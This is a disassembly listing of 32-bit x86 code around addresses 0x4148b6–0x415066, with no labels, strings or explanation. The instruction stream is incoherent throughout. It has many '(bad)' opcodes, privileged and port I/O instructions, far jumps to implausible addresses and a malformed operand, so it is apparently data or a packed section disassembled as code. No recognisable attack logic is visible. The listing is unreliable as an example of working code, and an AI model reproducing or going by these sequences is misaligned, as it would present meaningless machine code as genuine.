  4148b6:	mov    bl,0x16
  4148b8:	inc    edi
  4148b9:	cmp    BYTE PTR [esi-0x7555dc52],0x41
  4148c0:	ja     0x41492a
  4148c2:	pop    edx
  4148c3:	mov    edi,0x5f2df4e1
  4148c8:	std    
  4148c9:	dec    edx
  4148ca:	loope  0x414863
  4148cc:	(bad)  
  4148ce:	test   BYTE PTR [edi+0x17b922fd],ch
  4148d4:	sbb    cl,cl
  4148d6:	mov    dh,0xc9
  4148d8:	fwait
  4148d9:	outs   dx,DWORD PTR ds:[esi]
  4148da:	pop    esi
  4148db:	fsubr  st(3),st
  4148dd:	push   ecx
  4148de:	sbb    al,0xee
  4148e0:	sub    eax,0xf40c2f53
  4148e5:	push   es
  4148e6:	pusha  
  4148e7:	cli    
  4148e8:	xchg   ebp,eax
  4148e9:	in     eax,0x7e
  4148eb:	mov    ch,0x89
  4148ed:	jp     0x414950
  4148ef:	sub    esi,ebx
  4148f1:	sti    
  4148f2:	int    0xe2
  4148f4:	leave  
  4148f5:	mov    bh,0x68
  4148f7:	repz enter 0x2184,0xd8
  4148fc:	cmp    esp,DWORD PTR [eax-0x46]
  4148ff:	and    cl,ah
  414901:	fstp   TBYTE PTR [eax+0x3c]
  414904:	gs cmp eax,eax
  414907:	mov    dh,BYTE PTR [esi]
  414909:	and    eax,0x78727d38
  41490e:	push   edi
  41490f:	cli    
  414910:	out    dx,al
  414911:	fld    DWORD PTR [esi-0x71219a6c]
  414917:	xor    al,0xed
  414919:	add    cl,al
  41491b:	push   edx
  41491c:	aas    
  41491d:	adc    DWORD PTR [ebp-0x454cb30d],ecx
  414923:	dec    esp
  414924:	xor    al,BYTE PTR [ecx+0x319836eb]
  41492a:	xchg   BYTE PTR [edi-0x3d121e39],cl
  414930:	pop    edx
  414931:	fdiv   DWORD PTR [edx+0x63]
  414934:	pop    ecx
  414935:	sbb    eax,0xeca5e4c8
  41493a:	ins    DWORD PTR es:[edi],dx
  41493b:	imul   ecx,DWORD PTR [edi-0x6e],0xffffffe9
  41493f:	mov    ecx,0x4ef8dbc0
  414944:	xor    eax,0x48d63863
  414949:	or     eax,0x46af15c5
  41494e:	cmp    bh,BYTE PTR [ebx+0xe8fc540]
  414954:	lahf   
  414955:	mov    eax,ds:0xa98441e8
  41495a:	push   es
  41495b:	xchg   DWORD PTR [esp+ecx*2],eax
  41495e:	xor    BYTE PTR [edi+edi*8],0x43
  414962:	in     eax,0x12
  414964:	mov    ds:0x482cefc3,al
  414969:	inc    ecx
  41496a:	add    esi,DWORD PTR [ebx-0x6b]
  41496d:	dec    edi
  41496e:	pop    ds
  41496f:	retf   
  414970:	sbb    eax,DWORD PTR [ecx+0x37]
  414973:	push   edi
  414974:	dec    ebx
  414975:	and    ch,dh
  414977:	xchg   ecx,eax
  414978:	ret    0xe17e
  41497b:	or     al,0x8f
  41497d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41497e:	fst    DWORD PTR [edi+0x2b71eb2a]
  414984:	xor    eax,0x34b6650b
  414989:	xchg   DWORD PTR [ebx-0x48],esp
  41498c:	outs   dx,BYTE PTR ds:[esi]
  41498d:	sub    BYTE PTR [esi-0x8],al
  414990:	push   cs
  414991:	mov    ebp,0xf28a0e48
  414996:	fldcw  WORD PTR [ecx]
  414998:	shl    DWORD PTR [ecx+0x7c],0xa0
  41499c:	test   BYTE PTR [esp+edi*8-0x58a78c64],bh
  4149a3:	pop    edi
  4149a4:	pop    ds
  4149a5:	and    DWORD PTR [ecx*2-0x375201bf],esp
  4149ac:	jmp    0x75c4:0x81414776
  4149b3:	jle    0x414967
  4149b5:	mov    cl,0x51
  4149b7:	pop    ebp
  4149b8:	inc    ecx
  4149b9:	fisubr DWORD PTR [ebp+0x36ce378]
  4149bf:	fstp   st(0)
  4149c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149c2:	mov    edx,0x4e21c8ce
  4149c7:	mov    eax,ds:0xa1c8c078
  4149cc:	xchg   ebx,eax
  4149cd:	repz call 0xf1d0:0x7804fc83
  4149d5:	jl     0x414966
  4149d7:	xchg   ebp,eax
  4149d8:	repnz cwde 
  4149da:	enter  0xfcc9,0x2b
  4149de:	imul   edx,ecx,0x3a316433
  4149e4:	jle    0x4149e7
  4149e6:	data16 std 
  4149e8:	pop    esi
  4149e9:	outs   dx,BYTE PTR ds:[esi]
  4149ea:	out    dx,al
  4149eb:	sahf   
  4149ec:	push   edi
  4149ed:	dec    edx
  4149ee:	stc    
  4149ef:	pushf  
  4149f0:	mov    edx,0x9a9482bf
  4149f5:	test   BYTE PTR [ecx+0x7c],dh
  4149f8:	and    DWORD PTR [ebp+0x2c],edi
  4149fb:	scas   eax,DWORD PTR es:[edi]
  4149fc:	cmp    ecx,DWORD PTR [ecx]
  4149fe:	xchg   DWORD PTR [esi+0x6632571d],ecx
  414a04:	fldcw  WORD PTR [ebp-0x3c1a002b]
  414a0a:	fld    TBYTE PTR [ebx-0x74d83279]
  414a10:	clc    
  414a11:	xchg   esp,eax
  414a12:	imul   esp,DWORD PTR [esi],0x4dd1ed01
  414a18:	out    dx,eax
  414a19:	in     eax,0x4a
  414a1b:	push   cs
  414a1c:	dec    ebx
  414a1d:	or     dh,BYTE PTR [esi-0x7b]
  414a20:	leave  
  414a21:	into   
  414a22:	(bad)  
  414a23:	repz cwde 
  414a25:	fisubr DWORD PTR [eax+0x1a87f7d]
  414a2b:	cmp    eax,0x59eb0a97
  414a30:	loope  0x414a4b
  414a32:	nop    DWORD PTR [eax+eax*1-0x5a]
  414a37:	mov    ah,0x5b
  414a39:	mov    ch,0xd2
  414a3b:	(bad)  
  414a3c:	fstp   QWORD PTR [ebp+0x23f10b26]
  414a42:	jnp    0x414a82
  414a44:	gs push 0x25
  414a47:	ret    
  414a48:	retf   0x64ac
  414a4b:	jae    0x4149ed
  414a4d:	sar    BYTE PTR [edi+ebp*4],0x34
  414a51:	dec    DWORD PTR [esi+0x62]
  414a54:	lea    edi,[ecx-0x77f0db1]
  414a5a:	inc    ebp
  414a5b:	or     eax,0x8aa8eef0
  414a60:	lods   al,BYTE PTR ds:[esi]
  414a61:	jmpw   0x28ad
  414a65:	or     eax,0x8134a539
  414a6a:	push   0x61b20bfc
  414a6f:	adc    DWORD PTR [ebx],0x5a34a0bf
  414a75:	retf   0x41a9
  414a78:	push   edx
  414a79:	add    al,0xd8
  414a7b:	add    bl,bl
  414a7d:	into   
  414a7e:	ret    
  414a7f:	mov    ebx,0xc13e8cc6
  414a84:	das    
  414a85:	(bad)  
  414a87:	adc    BYTE PTR [ebx],bl
  414a89:	repz and al,0x78
  414a8c:	std    
  414a8d:	je     0x414ab3
  414a8f:	dec    esi
  414a90:	mov    eax,0x75c262b8
  414a95:	inc    ebx
  414a96:	mov    ecx,0xdfa9e471
  414a9b:	push   eax
  414a9c:	test   ah,bl
  414a9e:	retf   0xed62
  414aa1:	push   ecx
  414aa2:	aaa    
  414aa3:	fxch   st(7)
  414aa5:	cmc    
  414aa6:	sbb    eax,0x3f370026
  414aab:	push   ss
  414aac:	jmp    0x414acf
  414aae:	sub    DWORD PTR [edi+eiz*8-0x35],edi
  414ab2:	and    BYTE PTR [edi+0x2336fb75],bl
  414ab8:	or     esi,DWORD PTR [edx-0x66bc906c]
  414abe:	fsub   st(6),st
  414ac0:	pop    es
  414ac1:	push   0x7b64f694
  414ac6:	mov    dh,0x73
  414ac8:	(bad)  
  414ac9:	adc    al,0xa
  414acb:	(bad)  
  414acc:	outs   dx,BYTE PTR ds:[esi]
  414acd:	inc    ebx
  414ace:	hlt    
  414acf:	and    eax,0xe70bb023
  414ad4:	ret    0x3ffe
  414ad7:	iret   
  414ad8:	dec    eax
  414ad9:	int3   
  414ada:	jb     0x414ab4
  414adc:	pop    esi
  414add:	or     al,0x6c
  414adf:	ret    
  414ae0:	fisub  DWORD PTR [edx]
  414ae2:	add    al,ch
  414ae4:	shl    DWORD PTR [edx-0x6b],1
  414ae7:	lds    edx,FWORD PTR [esi+0x70fec857]
  414aed:	or     DWORD PTR [edx+0x53],ecx
  414af0:	fwait
  414af1:	sbb    bh,cl
  414af3:	aam    0xb
  414af5:	xor    al,0x41
  414af7:	mov    eax,0x5e5ef800
  414afc:	xchg   esi,eax
  414afd:	push   ss
  414afe:	sub    dh,BYTE PTR [ebp-0x250cf4d8]
  414b04:	pop    ebp
  414b05:	bnd jl 0x414b08
  414b08:	into   
  414b09:	or     dl,BYTE PTR [ebx-0x28f4f26c]
  414b0f:	mov    bl,0xf0
  414b11:	jno    0x414b22
  414b13:	fisttp WORD PTR [ecx]
  414b15:	or     DWORD PTR [ecx+esi*2+0xf],ebx
  414b19:	cli    
  414b1a:	mov    al,ds:0x3381971d
  414b1f:	mov    ds:0x5dff6a68,eax
  414b24:	xor    al,0x95
  414b26:	sub    eax,0x53155437
  414b2b:	adc    BYTE PTR [edi+0x4c0747d0],0xab
  414b32:	sbb    al,0x67
  414b34:	lea    ecx,[eax]
  414b36:	dec    esp
  414b37:	pop    edi
  414b38:	pop    edi
  414b39:	or     eax,0xa61f42a4
  414b3e:	add    DWORD PTR [ebp+0x21f888ed],ecx
  414b44:	inc    esi
  414b45:	sub    al,0xb1
  414b47:	daa    
  414b48:	retf   
  414b49:	jge    0x414b5c
  414b4b:	mov    esp,0xd5eb411
  414b50:	xlat   BYTE PTR ds:[ebx]
  414b51:	iret   
  414b52:	aad    0x34
  414b54:	jecxz  0x414b0f
  414b56:	jmp    0x414b14
  414b58:	or     BYTE PTR [ecx+0x3c574832],0x5d
  414b5f:	and    esi,edi
  414b61:	scas   eax,DWORD PTR es:[edi]
  414b62:	js     0x414b26
  414b64:	and    eax,0x71493ac4
  414b69:	mov    ds:0x85f27592,eax
  414b6e:	and    edi,0x8f9ca5d5
  414b74:	aam    0xb4
  414b76:	cwde   
  414b77:	mov    ebx,fs
  414b79:	push   es
  414b7a:	push   ds
  414b7b:	loopne 0x414b7b
  414b7d:	mov    ecx,0xe84cc477
  414b82:	push   0x16e72c1f
  414b87:	pop    ebp
  414b88:	div    DWORD PTR [edx+0x3d707c13]
  414b8e:	adc    dh,BYTE PTR [ecx+0x77]
  414b91:	dec    ebx
  414b92:	dec    esi
  414b93:	cli    
  414b94:	mov    cs,ebp
  414b96:	(bad)  
  414b97:	mov    eax,0x9b9d1aea
  414b9c:	push   edi
  414b9d:	or     DWORD PTR [ebx+0x11],ecx
  414ba0:	push   esi
  414ba1:	jno    0x414ba5
  414ba3:	push   0x6b0ac171
  414ba8:	pop    ebp
  414ba9:	mov    ds:0xce4e9ba6,eax
  414bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414baf:	jmp    0x6ffa8d1
  414bb4:	add    eax,0x82d9e133
  414bb9:	fmul   st,st(1)
  414bbb:	cmp    DWORD PTR [edi],esi
  414bbd:	repnz sub eax,0xd8aa7c9b
  414bc3:	mov    bl,0xe4
  414bc5:	mov    gs,eax
  414bc7:	out    dx,al
  414bc8:	inc    ecx
  414bc9:	mov    al,ds:0x5c8303f6
  414bce:	jae    0x414bca
  414bd0:	ins    BYTE PTR es:[edi],dx
  414bd1:	pop    ds
  414bd2:	scas   al,BYTE PTR es:[edi]
  414bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bd4:	jl     0x414c06
  414bd6:	inc    ecx
  414bd7:	jecxz  0x414be1
  414bd9:	lock or ecx,edi
  414bdc:	(bad)  
  414bdd:	xor    DWORD PTR [ebx-0xb],eax
  414be0:	icebp  
  414be1:	dec    edx
  414be2:	(bad)  
  414be3:	mov    WORD PTR [ecx+0x32dd2a7d],cs
  414be9:	dec    ebp
  414bea:	inc    esi
  414beb:	jb     0x414b76
  414bed:	daa    
  414bee:	sub    DWORD PTR [esi+0x67],0x962ce1e9
  414bf5:	cmp    DWORD PTR [esi],ecx
  414bf7:	bound  esi,QWORD PTR [ebx-0x24a85098]
  414bfd:	dec    ebx
  414bfe:	inc    ecx
  414bff:	mov    DWORD PTR [esi-0x3c],ecx
  414c02:	fs sub eax,0x9e912363
  414c08:	adc    ch,BYTE PTR [edx+0x4d22ef7b]
  414c0e:	arpl   bp,bx
  414c10:	or     DWORD PTR [edx],esi
  414c12:	mov    bl,0xae
  414c14:	or     al,0xb4
  414c16:	cmp    ebp,edi
  414c18:	xor    bh,al
  414c1a:	in     al,0x89
  414c1c:	or     bl,BYTE PTR [esi+edx*2-0x6f]
  414c20:	test   ch,bl
  414c22:	call   0x76533e02
  414c27:	fmul   DWORD PTR [eax]
  414c29:	(bad)  
  414c2a:	xor    DWORD PTR [esi-0x68],ebx
  414c2d:	adc    eax,DWORD PTR [edx-0x4f2dbce6]
  414c33:	mov    ecx,0x78be5944
  414c38:	jmp    0x8f8e210e
  414c3d:	mov    esi,0x79be3115
  414c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c43:	(bad)
  414c46:	push   eax
  414c47:	dec    eax
  414c48:	sub    al,0xf2
  414c4a:	lock push ecx
  414c4c:	inc    edx
  414c4d:	mov    edx,eax
  414c4f:	sbb    BYTE PTR [ebx-0x4d],ah
  414c52:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c54:	push   ds
  414c55:	shr    esp,cl
  414c57:	add    edi,eax
  414c59:	retf   0xd737
  414c5c:	xlat   BYTE PTR ds:[ebx]
  414c5d:	lods   eax,DWORD PTR ds:[esi]
  414c5e:	jl     0x414cba
  414c60:	stos   BYTE PTR es:[edi],al
  414c61:	hlt    
  414c62:	fbld   TBYTE PTR [ebx+0x7c]
  414c65:	popa   
  414c66:	aam    0x1
  414c68:	push   ds
  414c69:	retf   
  414c6a:	jge    0x414c3b
  414c6c:	sbb    DWORD PTR [edx+eiz*8],esi
  414c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c70:	jne    0x414ce5
  414c72:	add    al,0xe7
  414c74:	push   ebx
  414c75:	inc    ebx
  414c76:	ins    DWORD PTR es:[edi],dx
  414c77:	pop    edx
  414c78:	rol    BYTE PTR [ecx-0x5d597d74],0x78
  414c7f:	(bad)  
  414c80:	sti    
  414c81:	in     eax,dx
  414c82:	or     ebp,0x2b
  414c85:	call   0x32ae:0xc72a941f
  414c8c:	mov    eax,0x1d12788e
  414c91:	xchg   DWORD PTR [eax-0x3f],edi
  414c94:	leave  
  414c95:	aas    
  414c96:	enter  0xf965,0x20
  414c9a:	xor    di,WORD PTR [ecx]
  414c9d:	(bad)  
  414c9e:	pusha  
  414c9f:	es out 0x0,eax
  414ca2:	mov    eax,0x1e87b73e
  414ca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ca8:	mov    dh,0x91
  414caa:	dec    ebx
  414cab:	mov    dl,0xac
  414cad:	add    ebx,DWORD PTR [ebp-0x74]
  414cb0:	sbb    BYTE PTR [eax],cl
  414cb2:	xchg   edi,eax
  414cb3:	and    BYTE PTR [edi+0x1a],bl
  414cb6:	jnp    0x414d1e
  414cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cb9:	retf   0x666f
  414cbc:	imul   ebp
  414cbe:	lods   eax,DWORD PTR ds:[esi]
  414cbf:	cmp    ebp,DWORD PTR [ecx-0x39b35dcc]
  414cc5:	mov    eax,ds:0x3ec1faec
  414cca:	test   dh,ch
  414ccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ccd:	test   al,0x70
  414ccf:	jg     0x414c71
  414cd1:	jns    0x414cdf
  414cd3:	out    dx,eax
  414cd4:	cmp    esi,DWORD PTR [edi+0x7d]
  414cd7:	sti    
  414cd8:	mov    ecx,ds
  414cda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cdb:	fwait
  414cdc:	mov    al,0xc4
  414cde:	in     al,dx
  414cdf:	pop    ebp
  414ce0:	xchg   esi,eax
  414ce1:	push   0xffffffd3
  414ce3:	add    ebp,eax
  414ce5:	jns    0x414cf0
  414ce7:	cs mov edx,0x632db0f9
  414ced:	sar    BYTE PTR [ecx],1
  414cef:	stc    
  414cf0:	push   cs
  414cf1:	ins    DWORD PTR es:[edi],dx
  414cf2:	sbb    eax,0x3c1dcfad
  414cf7:	out    dx,al
  414cf8:	push   ebp
  414cf9:	dec    ebp
  414cfa:	cmp    bh,cl
  414cfc:	fadd   QWORD PTR [ecx]
  414cfe:	test   DWORD PTR [eax+0x6f106ad0],ebx
  414d04:	mov    edx,0xbf653524
  414d09:	mov    ch,0x78
  414d0b:	lock fadd st(6),st
  414d0e:	ror    BYTE PTR [ebx-0xb57b19a],0x31
  414d15:	mov    BYTE PTR [edi-0x7eae563d],dh
  414d1b:	inc    ecx
  414d1d:	xor    bh,BYTE PTR [edx+0x5a30739e]
  414d23:	and    esi,DWORD PTR [edx]
  414d25:	dec    edi
  414d26:	js     0x414d51
  414d28:	das    
  414d29:	sbb    eax,ebp
  414d2b:	pusha  
  414d2c:	jae    0x414d57
  414d2e:	add    DWORD PTR [ebx-0x6ce67b58],esp
  414d34:	pop    edi
  414d35:	ds cwde 
  414d37:	into   
  414d38:	push   edx
  414d39:	push   cs
  414d3a:	and    edi,DWORD PTR ds:0x35d9bdd5
  414d40:	pop    edx
  414d41:	imul   eax,DWORD PTR [edx+ebp*2-0x2],0x41
  414d46:	mov    bl,0x11
  414d48:	mov    ch,0x6a
  414d4a:	pop    edi
  414d4b:	mov    bh,BYTE PTR [ebx-0x40]
  414d4e:	js     0x414cd1
  414d50:	jo     0x414d2d
  414d52:	ds inc edx
  414d54:	mov    ebp,0x661e045
  414d59:	xchg   esp,eax
  414d5a:	xchg   edx,eax
  414d5b:	cmp    al,0xa2
  414d5d:	lahf   
  414d5e:	sbb    eax,0x4038c3b2
  414d63:	retf   
  414d64:	outs   dx,DWORD PTR ds:[esi]
  414d65:	aas    
  414d66:	adc    DWORD PTR [edx+0x3338325e],0x57
  414d6d:	sub    DWORD PTR [ebp+0x2c126b7a],ebx
  414d73:	je     0x414d1f
  414d75:	out    dx,eax
  414d76:	lods   eax,DWORD PTR ds:[esi]
  414d77:	adc    al,0xbc
  414d79:	ds (bad) 
  414d7b:	js     0x414d48
  414d7d:	xlat   BYTE PTR ds:[ebx]
  414d7e:	pop    edx
  414d7f:	or     BYTE PTR [ebx+0x25d43c6],dl
  414d85:	shr    BYTE PTR [eax+0x48],0xf0
  414d89:	ins    DWORD PTR es:[edi],dx
  414d8a:	outs   dx,BYTE PTR ds:[esi]
  414d8b:	retf   
  414d8c:	icebp  
  414d8d:	cli    
  414d8e:	fsub   QWORD PTR [ebx+0x7e]
  414d91:	cld    
  414d92:	loop   0x414d25
  414d94:	std    
  414d95:	push   edx
  414d96:	jmp    0xbdad71d6
  414d9b:	cwde   
  414d9c:	les    esp,FWORD PTR [edi+0x24]
  414d9f:	xchg   edi,eax
  414da0:	popf   
  414da1:	or     eax,0x5eed9e9b
  414da6:	pop    ss
  414da7:	test   al,0x64
  414da9:	mov    al,0xc7
  414dab:	jne    0x414d5a
  414dad:	mov    ah,0x5f
  414daf:	mov    esi,0xe9dadc51
  414db4:	data16 clc 
  414db6:	out    0x14,al
  414db8:	and    DWORD PTR [eax-0x58],esp
  414dbb:	pop    edx
  414dbc:	imul   eax,edi,0xe825cf65
  414dc2:	pop    esi
  414dc3:	jg     0x414e06
  414dc5:	dec    ebx
  414dc6:	sbb    BYTE PTR [esi],dh
  414dc8:	pop    edi
  414dc9:	das    
  414dca:	mov    WORD PTR [ebp+esi*4-0x365055b0],ss
  414dd1:	cwde   
  414dd2:	pop    eax
  414dd3:	les    ebp,FWORD PTR [ebx+edx*1+0x3ce55ee3]
  414dda:	mov    BYTE PTR [eax+0x0],dl
  414ddd:	ror    edx,cl
  414ddf:	sbb    al,0x72
  414de1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414de2:	mov    ds:0x30c840bc,al
  414de7:	sbb    eax,eax
  414de9:	jns    0x414db9
  414deb:	test   BYTE PTR es:[ebp+ebp*2+0x16],ch
  414df0:	xchg   ecx,eax
  414df1:	out    dx,al
  414df2:	(bad)  
  414df3:	ss xor edx,0xbea059f
  414dfa:	shr    DWORD PTR [eax],0x8c
  414dfd:	out    0x5d,al
  414dff:	mov    ah,0x4b
  414e01:	fidivr WORD PTR [ebx-0xf30b6d]
  414e07:	retf   
  414e08:	adc    BYTE PTR [ebp+0x3d],dh
  414e0b:	xchg   DWORD PTR [eax+0x129d5a33],ebx
  414e11:	pop    esp
  414e12:	xchg   edx,eax
  414e13:	jnp    0x414e10
  414e15:	call   DWORD PTR [edx+eax*8]
  414e18:	sub    BYTE PTR [edi],dl
  414e1a:	popa   
  414e1b:	pop    ss
  414e1c:	cmc    
  414e1d:	xor    BYTE PTR [ebx-0x6f366f4a],ah
  414e23:	(bad)  
  414e24:	in     al,dx
  414e25:	jle    0x414e5c
  414e27:	clc    
  414e28:	lea    ebx,[edi-0x1a]
  414e2b:	mov    esi,0xd62e085e
  414e30:	mov    ds:0x46a63c0b,al
  414e35:	ret    0x242c
  414e38:	ins    DWORD PTR es:[edi],dx
  414e39:	int3   
  414e3a:	mov    cl,0xc3
  414e3c:	push   0x43
  414e3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e3f:	loopne 0x414e37
  414e41:	sub    BYTE PTR [eax],bl
  414e43:	je     0x414e9f
  414e45:	rol    dl,cl
  414e47:	jmp    0x414df1
  414e49:	shl    eax,0x3f
  414e4c:	sbb    bh,al
  414e4e:	pop    es
  414e4f:	mov    ds:0x5be87c49,al
  414e54:	(bad)  
  414e55:	sbb    dh,BYTE PTR [esi-0x2]
  414e58:	fwait
  414e59:	inc    edx
  414e5a:	stos   BYTE PTR es:[edi],al
  414e5b:	sbb    eax,0xe8b79c1f
  414e60:	adc    edi,DWORD PTR [ebx-0x48]
  414e63:	lea    esp,[eax]
  414e65:	mov    ebp,0x175d943d
  414e6a:	sti    
  414e6b:	ror    BYTE PTR [eax+0x452a0e9],cl
  414e71:	dec    edi
  414e72:	clc    
  414e73:	rol    BYTE PTR ds:0x9df529cb,1
  414e79:	and    BYTE PTR [edi+0x5e5986b7],ah
  414e7f:	aas    
  414e80:	and    al,0x3a
  414e82:	sub    BYTE PTR [esi],bh
  414e84:	push   esi
  414e85:	jae    0x414ee4
  414e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e88:	push   0x4a
  414e8a:	std    
  414e8b:	inc    esi
  414e8c:	cdq    
  414e8d:	sbb    edi,edi
  414e8f:	popa   
  414e90:	mov    bl,0x41
  414e92:	out    dx,eax
  414e93:	jge    0x414e94
  414e95:	xchg   esp,eax
  414e96:	loope  0x414e2a
  414e98:	mov    BYTE PTR [esi+0x859a77b],ah
  414e9e:	pushf  
  414e9f:	inc    esi
  414ea0:	pop    ss
  414ea1:	cmp    BYTE PTR [edx-0x4a],0x9d
  414ea5:	ror    ah,cl
  414ea7:	sub    eax,0xa0d7d65f
  414eac:	or     BYTE PTR [esi+edi*4-0x43],0xb8
  414eb1:	sub    al,0x2b
  414eb3:	stos   DWORD PTR es:[edi],eax
  414eb4:	or     eax,0xb655b6b4
  414eb9:	mov    eax,ds:0xea2fc85
  414ebe:	cld    
  414ebf:	es jo  0x414e8f
  414ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ec3:	adc    BYTE PTR [edx],dh
  414ec5:	retf   
  414ec6:	dec    eax
  414ec7:	push   ecx
  414ec8:	dec    esi
  414ec9:	fst    QWORD PTR [ecx+0x7365244f]
  414ecf:	ss cs into 
  414ed2:	loopne 0x414f11
  414ed4:	popa   
  414ed5:	hlt    
  414ed6:	xchg   esp,eax
  414ed7:	ins    BYTE PTR es:[edi],dx
  414ed8:	cmp    ch,bh
  414eda:	push   ebp
  414edb:	aas    
  414edc:	lea    eax,[ecx]
  414ede:	jle    0x414ea8
  414ee0:	mov    bl,0xd0
  414ee2:	jbe    0x414ee2
  414ee4:	jns    0x414f43
  414ee6:	jb     0x414f18
  414ee8:	mov    edx,0x578dab0b
  414eed:	add    bl,BYTE PTR [esi+0x4599cd90]
  414ef3:	das    
  414ef4:	rol    DWORD PTR [edi+0x574bb31e],1
  414efa:	(bad)  
  414efb:	dec    esi
  414efc:	push   ds
  414efd:	gs sbb eax,0x938d418f
  414f03:	fdivr  DWORD PTR [eax-0x2f12f8a0]
  414f09:	cmp    BYTE PTR [ebx],0x92
  414f0c:	sbb    al,0xce
  414f0e:	cld    
  414f0f:	cmc    
  414f10:	in     eax,dx
  414f11:	lea    edx,[eiz*4+0x799a338]
  414f18:	jno    0x414f02
  414f1a:	mov    edi,0xcb1df8bc
  414f1f:	arpl   WORD PTR [esi-0x3706c560],dx
  414f25:	adc    al,dh
  414f27:	loopne 0x414ed6
  414f29:	imul   ebp,DWORD PTR [edi+0x0],0x2
  414f2d:	fisttp QWORD PTR [ebx]
  414f2f:	mov    ch,0x56
  414f31:	or     ch,BYTE PTR [ebp+edx*8+0x29]
  414f35:	sub    al,0xa5
  414f37:	daa    
  414f38:	inc    ebp
  414f39:	daa    
  414f3a:	pop    edx
  414f3b:	(bad)  
  414f3c:	cmp    dh,BYTE PTR [ebx-0x4368e7c0]
  414f42:	in     al,dx
  414f43:	mov    WORD PTR [ebx+0x78],?
  414f46:	cmc    
  414f47:	sbb    dl,BYTE PTR [edx-0x4b]
  414f4a:	jae    0x414f27
  414f4c:	inc    ebp
  414f4d:	aas    
  414f4e:	cs popf 
  414f50:	js     0x414f45
  414f52:	bound  eax,QWORD PTR [edx-0x60c0a2d1]
  414f58:	mov    ecx,esp
  414f5a:	add    ch,ch
  414f5c:	arpl   WORD PTR [eax],bx
  414f5e:	iret   
  414f5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f60:	sahf   
  414f61:	nop
  414f62:	mov    BYTE PTR [ebp+0x5883ea5e],dl
  414f68:	jmp    0xd14c4ed2
  414f6d:	lods   al,BYTE PTR ds:[esi]
  414f6e:	inc    edi
  414f6f:	sub    ebp,esp
  414f71:	sub    dh,0xb
  414f74:	daa    
  414f75:	fucompp 
  414f77:	out    dx,eax
  414f78:	push   cs
  414f79:	pop    eax
  414f7a:	and    eax,0x9c916f79
  414f7f:	fwait
  414f80:	stos   BYTE PTR es:[edi],al
  414f81:	add    eax,0x6419b65f
  414f86:	mov    dh,0xf5
  414f88:	rcl    ebx,1
  414f8a:	fs pop ecx
  414f8c:	xlat   BYTE PTR ds:[ebx]
  414f8d:	js     0x414f93
  414f8f:	out    dx,eax
  414f90:	(bad)
  414f93:	cmp    edx,DWORD PTR [ebx+0x36]
  414f96:	mov    ds:0x6bfb47e,al
  414f9b:	jp     0x415013
  414f9d:	nop
  414f9e:	inc    esp
  414f9f:	add    bl,dl
  414fa1:	daa    
  414fa2:	test   al,0x1d
  414fa4:	ds dec edi
  414fa6:	std    
  414fa7:	das    
  414fa8:	xor    esp,DWORD PTR [esi+0x13]
  414fab:	xor    ah,dh
  414fad:	push   ds
  414fae:	or     eax,DWORD PTR [ebp-0x443926d5]
  414fb4:	or     ebx,ebp
  414fb6:	mov    ah,0xb2
  414fb8:	xor    ch,BYTE PTR [ebx+0x2a0d0738]
  414fbe:	adc    ch,BYTE PTR [edx-0xf]
  414fc1:	adc    DWORD PTR [ecx],esi
  414fc3:	or     eax,0xda92079d
  414fc8:	jecxz  0x414f83
  414fca:	mov    eax,ds:0xbf50808a
  414fcf:	popa   
  414fd0:	fsub   QWORD PTR [ecx-0x48049ce6]
  414fd6:	add    ch,BYTE PTR [ebx]
  414fd8:	jg     0x415057
  414fda:	push   esp
  414fdb:	mov    bh,0x2a
  414fdd:	xchg   esi,eax
  414fde:	sbb    dl,BYTE PTR [esi+0x13]
  414fe1:	push   edx
  414fe2:	mov    bh,0xd0
  414fe4:	sbb    eax,0x85e9d951
  414fe9:	idiv   DWORD PTR [ebp-0x4b]
  414fec:	jb     0x415012
  414fee:	jmp    0x414f71
  414ff0:	(bad)  
  414ff1:	jmp    FWORD PTR [ebx]
  414ff3:	jns    0x414f9c
  414ff5:	call   DWORD PTR [edx-0x4588e1f7]
  414ffb:	ffreep st(6)
  414ffd:	rcr    BYTE PTR [ecx+edi*8-0xd2c1d8f],cl
  415004:	(bad)  
  415005:	mov    bh,0x84
  415007:	pop    ss
  415008:	jp     0x41504f
  41500a:	xchg   edx,eax
  41500b:	ror    BYTE PTR [ebp+0x6b8ec0e7],cl
  415011:	call   0x5c406f6d
  415016:	or     ah,BYTE PTR [eax-0x7144fa65]
  41501c:	inc    ebp
  41501d:	dec    edi
  41501e:	hlt    
  41501f:	pop    ebp
  415020:	ins    BYTE PTR es:[edi],dx
  415021:	adc    eax,0x4976ad86
  415026:	push   ebx
  415027:	push   ebp
  415028:	push   cs
  415029:	cli    
  41502a:	mov    ecx,0xd0ba512c
  41502f:	fidiv  WORD PTR [edi]
  415031:	adc    DWORD PTR [edi-0x7c],esi
  415034:	push   ebx
  415035:	cmp    cl,ch
  415037:	xor    DWORD PTR [ecx],esi
  415039:	adc    BYTE PTR [edi-0x25],0x60
  41503d:	sbb    bl,dl
  41503f:	sti    
  415040:	into   
  415041:	jne    0x414feb
  415043:	ins    DWORD PTR es:[edi],dx
  415044:	cmp    ecx,esi
  415046:	push   ss
  415047:	call   0xef2c0d8b
  41504c:	jge    0x4150a4
  41504e:	jbe    0x415048
  415050:	cwde   
  415051:	pop    ds
  415052:	call   FWORD PTR [eax-0x5b2b770b]
  415058:	mov    ds:0x1eaf9aca,al
  41505d:	out    0x98,eax
  41505f:	retf   
  415060:	aaa    
  415061:	xor    edx,DWORD PTR [edx]
  415063:	dec    esp
  415064:	int3   
  415065:	(bad)  
  415066:	retf   
